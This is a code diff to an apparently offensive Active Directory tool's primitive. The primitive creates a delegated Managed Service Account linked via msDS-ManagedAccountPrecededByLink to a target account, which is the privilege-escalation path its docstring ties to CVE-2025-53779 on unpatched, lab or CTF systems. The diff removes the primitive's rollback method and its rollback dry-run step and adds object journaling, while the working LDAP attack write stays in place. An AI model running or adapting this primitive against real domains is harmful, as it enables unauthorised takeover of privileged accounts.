@@ -5,7 +5,6 @@ from typing import TYPE_CHECKING
 from dmsa_reaper.ldap.modify import add_object
 from dmsa_reaper.models import Operation, PathCandidate
 from dmsa_reaper.ops.operation_log import new_operation, save_operation
-from dmsa_reaper.ops.rollback import rollback_operation
 from dmsa_reaper.ops.verify import verify_operation_ldap
 from dmsa_reaper.primitives._ldap_helpers import (
     DMSA_MANAGED_PASSWORD_INTERVAL,
@@ -14,6 +13,7 @@ from dmsa_reaper.primitives._ldap_helpers import (
     DMSA_UAC,
     dmsa_dn,
     generate_dmsa_name,
+    journal_created_object,
     resolve_meta,
 )
 from dmsa_reaper.primitives.base import Primitive, PrimitiveError
@@ -26,8 +26,7 @@ class LegacyOneWayLinkPrimitive(Primitive):
     """Create a new dMSA and set msDS-ManagedAccountPrecededByLink to point at a target.
 
     Pre-CVE-2025-53779 (unpatched / lab / CTF) path.  The link is established
-    at creation time so there is only one LDAP write; rollback simply deletes
-    the new dMSA object.
+    at creation time so there is only one LDAP write.
 
     Requires:
         - CreateChild:msDS-DelegatedManagedServiceAccount on the container.
@@ -73,8 +72,8 @@ class LegacyOneWayLinkPrimitive(Primitive):
         sam = f"{cn}$"
 
         # Record the intended DN before the LDAP write. If the server applies
-        # the add but the client receives an exception, rollback can inspect and
-        # clean up maybe_created_dns without assuming the object is absent.
+        # the add but the client receives an exception, the operation log still
+        # shows the DN that may now exist.
         operation.status = "running"
         operation.maybe_created_dns.append(new_dn)
         operation.metadata["created_dmsa_dn"] = new_dn
@@ -96,6 +95,7 @@ class LegacyOneWayLinkPrimitive(Primitive):
                     "msDS-ManagedAccountPrecededByLink": target_dn,
                 },
             )
+            journal_created_object(operation, conn, new_dn)
         except Exception as exc:
             operation.status = "failed"
             operation.errors.append(f"add_object {new_dn}: {exc}")
@@ -112,11 +112,6 @@ class LegacyOneWayLinkPrimitive(Primitive):
 
     def verify(self, operation: Operation, *, conn: "Connection | None" = None) -> bool:
         return verify_operation_ldap(operation, conn=conn)
-
-    def rollback(self, operation: Operation, *, conn: "Connection | None" = None) -> bool:
-        operation = rollback_operation(operation, conn=conn)
-        save_operation(operation)
-        return operation.status == "rolled-back"
 
     def dry_run_steps(self, operation: Operation) -> list[str]:
         meta = operation.metadata
@@ -137,6 +132,5 @@ class LegacyOneWayLinkPrimitive(Primitive):
             f"  msDS-DelegatedMSAState                  : {DMSA_STATE_COMPLETED}  (migration-completed)",
             f"  msDS-ManagedAccountPrecededByLink       : {target_dn}",
             "",
-            f"ROLLBACK: DELETE {new_dn}",
             "  (CN above is an example — a new random suffix is generated at execute time)",
         ]
